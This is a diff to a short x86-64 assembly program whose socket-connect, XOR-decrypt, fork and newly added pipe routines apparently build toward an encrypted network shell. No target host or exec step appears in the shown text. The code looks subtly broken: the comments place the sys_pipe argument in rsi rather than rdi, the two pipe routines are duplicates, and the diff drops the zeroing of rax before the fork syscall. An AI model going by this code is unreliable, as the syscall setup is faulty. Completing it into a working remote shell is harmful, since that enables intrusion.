@@ -2,7 +2,12 @@ BITS 64
 
 SECTION .bss
 	sock_buffer resb 255
-
+    p0:
+    .read   resd    1
+    .write  resd    1
+    p1:
+    .read   resd    1
+    .write  resd    1
 SECTION .text
 global _start
 _start:
@@ -45,6 +50,20 @@ _connect:
         mov al, 42
         syscall
 
+; ---- (22) sys_pipe (int *filedes) ----
+_child_pipe:
+                            ; we already got rsi with the fd
+    mov al, 22
+    syscall
+    js _exit
+
+; ---- (22) sys_pipe (int *filedes) ----
+_parent_pipe:
+                            ; we already got rsi with the fd
+    mov al, 22
+    syscall
+    js _exit
+
 
 ; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
 _read:
@@ -83,7 +102,7 @@ _decrypt_xor:              ; xor function
 
 ; ---- (57) sys_fork ----
 _fork:
-    xor rax, rax
+
 	mov al, 57			; sys_fork
 	syscall
 
